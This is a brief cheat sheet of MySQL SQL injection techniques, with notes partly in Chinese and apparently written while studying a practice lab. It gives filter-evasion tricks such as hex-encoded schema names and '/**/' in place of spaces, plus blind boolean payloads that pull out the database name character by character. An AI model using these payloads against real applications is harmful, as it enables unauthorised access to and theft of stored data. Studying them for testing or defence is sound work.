mysql

hex：

```
select hex('security')
>7365637572697479
```
select * from information_schema.tables where table_schema=0x7365637572697479


CAST 

CAST('123') AS CHAR

IFNULL(DATABASE(),0x20)
mid(IFNULL(DATABASE(),0x20),1,1)
ORD(MID((IFNULL(DATABASE(),0x20)),5,1))>108  ##filter OR unless
ASCII(MID((IFNULL(CAST(DATABASE() AS CHAR),0x20)),5,1))>108

cot
```
select cot(2 and left(database(),1)>'a')
```

`/**/`
代替空格
